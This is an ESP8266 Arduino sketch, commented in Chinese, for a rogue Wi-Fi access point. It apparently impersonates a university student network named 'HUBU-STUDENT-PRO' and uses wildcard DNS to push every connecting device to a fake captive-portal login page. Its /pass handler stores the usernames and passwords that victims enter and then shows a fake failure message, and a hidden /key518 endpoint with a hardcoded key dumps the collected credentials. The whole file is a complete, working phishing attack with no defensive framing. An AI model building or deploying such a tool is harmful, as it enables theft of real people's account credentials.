#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <WiFiClient.h>
#include <FS.h>

// DNS默认端口，无需修改
const byte DNS_PORT = 53;

// WIFI名称
const char *ssid = "HUBU-STUDENT-PRO";

// AP的IP地址（即网关地址）
IPAddress apIP(192, 168, 1, 1);

// 查看存储密码的密码
String ppassword = "t123061";

DNSServer dnsServer;
ESP8266WebServer webServer(80);

// 存储账号密码
String data = "";

// 认证页面
String responseHTML = "<html><head><meta http-equiv=\"refresh\" content=\"1;URL='http://192.168.1.1/index.html'\"></head></html>";

// 登录失败页面
String responseHTML_error = "<html><head><meta http-equiv=\"refresh\" content=\"5;URL='http://192.168.1.1/index.html'\"><h3>&#x6CA1;&#x6709;&#x627E;&#x5230;&#x7B26;&#x5408;&#x6761;&#x4EF6;&#x7684;&#x7B56;&#x7565;&#xFF0C;5&#x79D2;&#x540E;&#x8FD4;&#x56DE;</h3></head></html>";


String getContentType(String filename){  
  if(webServer.hasArg("download")) return "application/octet-stream";  
  else if(filename.endsWith(".htm")) return "text/html";  
  else if(filename.endsWith(".html")) return "text/html";  
  else if(filename.endsWith(".css")) return "text/css";  
  else if(filename.endsWith(".js")) return "application/javascript";  
  else if(filename.endsWith(".png")) return "image/png";  
  else if(filename.endsWith(".gif")) return "image/gif";  
  else if(filename.endsWith(".jpg")) return "image/jpeg";  
  else if(filename.endsWith(".ico")) return "image/x-icon";  
  else if(filename.endsWith(".xml")) return "text/xml";  
  else if(filename.endsWith(".pdf")) return "application/x-pdf";  
  else if(filename.endsWith(".zip")) return "application/x-zip";  
  else if(filename.endsWith(".gz")) return "application/x-gzip";  
  return "text/plain";  
}  


// 查看存储的账号和密码
void paw(){
  if(webServer.arg("key")==ppassword){
    webServer.send(200, "text/plain", data);
  }else{
    webServer.send(200, "text/html", responseHTML);
  }
}

// 记录从钓鱼界面传过来的账号和密码
void pass(){
  if(webServer.arg("user") != "" && webServer.arg("pass") != ""){
    data += "username:";
    data += webServer.arg("user");
    data += "----password:";
    data += webServer.arg("pass");
    data += "\r\n";
    webServer.send(200, "text/html", responseHTML_error);
  }
}


void background() { 
  File file = SPIFFS.open("/background.jpg", "r");  
  size_t sent = webServer.streamFile(file, "image/jpeg");  
  file.close();  
  return;  
}
 void bootstrap() { 
  File file = SPIFFS.open("/bootstrap.css", "r");  
  size_t sent = webServer.streamFile(file, "text/css");  
  file.close();  
  return;  
}
 void logo_r() { 
  File file = SPIFFS.open("/logo.png", "r");  
  size_t sent = webServer.streamFile(file, "image/png");  
  file.close();  
  return;  
}
 void favicon() { 
  File file = SPIFFS.open("/favicon.ico", "r");  
  size_t sent = webServer.streamFile(file, "image/x-icon");  
  file.close();  
  return;  
}
 void main_r() { 
  File file = SPIFFS.open("/main.css", "r");  
  size_t sent = webServer.streamFile(file, "text/css");  
  file.close();  
  return;  
}
 void middle_r() { 
  File file = SPIFFS.open("/middle.png", "r");  
  size_t sent = webServer.streamFile(file, "image/png");  
  file.close();  
  return;  
}
 void uname_r() { 
  File file = SPIFFS.open("/uname.png", "r");  
  size_t sent = webServer.streamFile(file, "image/png");  
  file.close();  
  return;  
}
 void upwd_r() { 
  File file = SPIFFS.open("/upwd.png", "r");  
  size_t sent = webServer.streamFile(file, "image/png");  
  file.close();  
  return;  
}
void index_r(){
  File file = SPIFFS.open("/index.html", "r");  
  size_t sent = webServer.streamFile(file, "text/html");  
  file.close();  
  return;  
}

// 首页
void handleRoot() { 
  File file = SPIFFS.open("/index.html", "r");  
  size_t sent = webServer.streamFile(file, "text/html");  
  file.close();  
  return;  
}

void setup() {
  // WIFI配置
  Serial.begin(9600);
  SPIFFS.begin();  
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ssid);

  // DNS配置
  dnsServer.start(DNS_PORT, "*", apIP);

  // 配置404网页为首页
  webServer.onNotFound([]() {
    webServer.send(200, "text/html", responseHTML);
  });

  // 配置查看密码网页
  webServer.on ("/key518", HTTP_GET, paw);
  webServer.on("/", handleRoot);

  // 配置登录接口
  webServer.on("/pass", HTTP_GET, pass);

 webServer.on("/background.jpg", background);
 webServer.on("/bootstrap.css", bootstrap);
 webServer.on("/logo.png", logo_r);
 webServer.on("favicon.ico", favicon);
 webServer.on("/main.css", main_r);
 webServer.on("/middle.png", middle_r);
 webServer.on("/uname.png", uname_r);
 webServer.on("/upwd.png", upwd_r);

  webServer.on("/index.html", index_r);
  webServer.begin();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
